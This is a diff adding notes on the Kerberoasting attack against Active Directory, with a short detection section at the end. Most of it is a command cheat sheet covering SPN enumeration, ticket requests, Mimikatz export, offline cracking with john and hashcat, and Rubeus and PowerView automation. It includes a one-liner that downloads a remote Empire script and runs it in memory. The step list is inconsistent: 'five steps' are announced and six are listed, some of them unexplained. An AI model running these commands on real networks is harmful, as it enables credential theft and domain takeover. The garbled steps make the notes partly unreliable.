@@ -1,0 +1,75 @@
+Kerberoast
+    1) Kerberoast is the proccess of cracking service tickets and reqriting them in order to get access
+    to a targeted service. we can use legitimate active directory access in order to request and
+    export a service to crack its hashes offline and get the password, service tickets are encrypted
+    with NTLM so any user can dump the hashes from the service without a shell, sometimes services
+    will run with elevated accounts so cracking their tickets lead to full domain compromise.
+    The Kerberoast attacks takes five steps:
+    1. SPN Discovery - can be done with LDAP queries
+    2. Request Service Tickets
+    3. Export Service Tickets
+    4. Crack Service Tickets
+    5. Rewrite Service Tickets
+    6. Injecting to RAM the malicious ticket
+
+    ------------------
+    For Step number 1:
+    To perform the attack we need to get kerberoastable users SPNs,
+    In linux we can use:
+    - msf> use auxiliary/gather/get_user_spns
+    - GetUserSPNs.py -request -dc-ip 192.168.2.160 <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
+    - GetUserSPNs.py -request -dc-ip 192.168.2.160 -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
+    In windows we can use:
+    - setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
+    - Get-NetUser -SPN | select serviceprincipalname #Powerview
+    - .\Rubeus.exe kerberoast /stats
+    ------------------
+    For Step number 2:
+    We need to request service tickets,
+    # Get TGS into memory from a single user
+    - Add-Type -AssemblyName System.IdentityModel 
+    - New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local 
+    # Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
+    - setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+    ------------------
+    For Step number 3:
+    Now we need to extract the tickets,
+    # List kerberos tickets in memory
+    - klist
+    # Extract them from memory
+    - Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder
+    ------------------
+    For Step number 4:
+    We can use John The Ripper and or HashCat to crack the hashes,
+    # Transform kirbi ticket to john
+    - python kirbi2john.py sqldev.kirbi
+    - john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
+    # Or Transform john to hashcat
+    - sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
+    - hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
+    ------------------
+    We can also automate the entire process from steps 2 to 4:
+    # Powerview: Get Kerberoast hash of a user
+    - Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
+    # Powerview: Get all Kerberoast hashes
+    - Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation
+
+    # Rubeus
+    - .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+    - .\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
+    - .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins
+
+    # Invoke-Kerberoast
+    - iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
+    - Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
+    ------------------
+    If we get an error from linux: (Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)),
+    it means we need to syncronise out time with the DC with "ntpdate <DC IP Address>"
+    ------------------
+    In order to detect and mitigate the attack we can look at a few things:
+    We need to look at EventID 4769 - A kerberos ticket was requested,
+    and determine that the service name is not krbtgt, the service name does not end with a $,
+    account name should not be machine@domain, failure code is 0x0 (success) and ticket encryption
+    type of 0x17, and even than it is hard to determine that there is a kerberoast attack
+
+    - Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
